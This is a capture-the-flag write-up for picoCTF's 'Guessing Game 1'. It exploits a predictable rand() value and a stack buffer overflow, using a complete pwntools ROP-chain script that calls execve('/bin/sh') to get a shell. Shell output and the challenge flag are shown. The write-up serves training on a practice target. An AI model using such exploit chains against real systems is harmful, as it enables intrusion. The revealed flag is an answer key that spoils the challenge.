## Guessing Game 1

[Link to the challenge ](https://play.picoctf.org/practice/challenge/293) (reload the page)

This challenge provide 3 files the binary the code source and the Makefile

First thing lets analyze the code source

```#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

We can see that the program asks for a random number generated with rand()%100 +1 lets try and create a program that do the same thing 

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

long randomix()
{
	return rand()%100;
}

int main()
{
	int i = 10;
	while(i)
	{
		printf("%ld\n", randomix()+1);
		i--;
	}
	return 0;
}
```

the output :
```
┌──(env)─(root💀kali)-[/home/kali]
└─# ./a.out
84
87
78
16
94
36
87
93
50
22
```

the first number is 84 so lets create a script

```

from pwn import *

exe = ELF("./viln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 51462)

    return r

def main():
    r = conn()
    r.sendlineafter(b'What number would you like to guess?\n', bytes("84",encoding="utf-8"))
    a = r.recvline()
    print(a)
    #r.interactive()

if __name__ == "__main__":
    main()
```    

we got this as an output

```
└─# python3 p.py
[*] '/home/kali/hamid/viln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to jupiter.challenges.picoctf.org on port 51462: Done
b'Congrats! You win! Your prize is this print statement!\n'
[*] Closed connection to jupiter.challenges.picoctf.org port 51462
```

We did it and we are now on the win function if we go back to the source code we can see that there is a buffer over flow in this line 

``fgets(winner, 360, stdin);``

knowing that winner buffer size is only 100

First thing lets try to get the offset

```
┌──(env)─(root💀kali)-[/home/kali/hamid]
└─# python3 -i p.py
[*] '/home/kali/hamid/viln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[x] Opening connection to jupiter.challenges.picoctf.org on port 51462
[x] Opening connection to jupiter.challenges.picoctf.org on port 51462: Trying 3.131.60.8
[+] Opening connection to jupiter.challenges.picoctf.org on port 51462: Done
b'Congrats! You win! Your prize is this print statement!\n'
>>> r = process([exe.path])
[x] Starting local process '/home/kali/hamid/viln_patched'
[+] Starting local process '/home/kali/hamid/viln_patched': pid 2160
>>> r.sendlineafter(b'What number would you like to guess?\n', bytes("84",encoding="utf-8"))
b'Welcome to my guessing game!\n\nWhat number would you like to guess?\n'
>>> payload = cyclic(256)
>>> payload
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac'
>>> r.recvline()
b'Congrats! You win! Your prize is this print statement!\n'
>>> r.recvline()
b'\n'
>>> r.recv()
b'New winner!\nName? '
>>> r.sendline(payload)
>>> r.wait()
[*] Process '/home/kali/hamid/viln_patched' stopped with exit code -11 (SIGSEGV) (pid 2160)
>>> core = r.corefile
[x] Parsing corefile...
[*] '/home/kali/hamid/core.2160'
    Arch:      amd64-64-little
    RIP:       0x400c8b
    RSP:       0x7ffed93673d8
    Exe:       '/home/kali/hamid/viln_patched' (0x400000)
    Fault:     0x6261616762616166
[+] Parsing corefile...: Done
>>> offset = cyclic_find(pack(core.fault_addr))
[!] cyclic_find() expected a 4-byte subsequence, you gave b'faabgaab'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
>>> offset
120
>>>
```

We can now user ```ROPgadget --binary ./viln_patched --ropchain``` to get gadget that we can use for our payload
this is the interresting part:

```
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x410ca3 pop rsi ; ret
	[+] Gadget found: 0x4163f4 pop rax ; ret
	[+] Gadget found: 0x445950 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x445950 xor rax, rax ; ret
	[+] Gadget found: 0x475430 add rax, 1 ; ret
	[+] Gadget found: 0x475431 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x400696 pop rdi ; ret
	[+] Gadget found: 0x410ca3 pop rsi ; ret
	[+] Gadget found: 0x44a6b5 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x40137c syscall

- Step 5 -- Build the ROP chain
```

the thing is we gonna write "/bin/sh" somehwere then call   execve and give it the 3 args rsi rdi and rdx then syscall for that we gonna use this gadgets

but first thing we need to find where we gonna write "/bin/sh"
using readelf :

``readelf -S viln_patched``

we got .data 0x00000000006ba0e0

now let continue with syscall function it takes one arg its an int to the syscall for execve we got 59 following syscall table
<img width="1233" alt="Screen Shot 2023-06-09 at 3 20 12 PM" src="https://github.com/OussamaElouarti/picoCTF-Guessing-Game-1/assets/49252717/57dad3c3-47d7-4145-9427-65ad1a1592ef">

it takes 3 args the first one we will write /bin/bash on it /bin/sh =hex= 0x68732f6e69622f the other args we can put 0

after building the script we got this

```
#!/usr/bin/env python3

from pwn import *
import random

exe = ELF("./viln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 51462)

    return r


def main():
    r = conn()
    r.sendlineafter(b'What number would you like to guess?\n', bytes("84",encoding="utf-8"))
    p = b'a'*120
    p+= p64(0x4163f4) #pop rax
    p+= p64(0x68732f6e69622f) #/bin/sh
    p+= p64(0x410ca3) #pop rsi
    p+= p64(0x00000000006ba0e0) #.data address
    p+=p64(0x47ff91) #mov qword ptr [rsi], rax ; ret
    p+=p64(0x4163f4) #pop rax
    p+= p64(0x3B) #59 in hex execve 
    p+= p64(0x400696)#pop rdi
    p+=p64(0x00000000006ba0e0)#.data that contain /bin/sh
    p+=p64(0x410ca3)#pop rsi
    p+=p64(0x0)
    p+=p64(0x44a6b5)#pop rdx
    p+=p64(0x0)
    p+=p64(0x40137c) #syscall
    r.sendlineafter(b'Name? ', p)
    #print(a)
    r.interactive()


if __name__ == "__main__":
    main()
```

the output is 

```
─# python3 p.py
[*] '/home/kali/hamid/viln_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to jupiter.challenges.picoctf.org on port 51462: Done
[*] Switching to interactive mode
Congrats aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf4cA

$ whoami
guessing-game-1_0
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_44d502016ea374b8}$
```
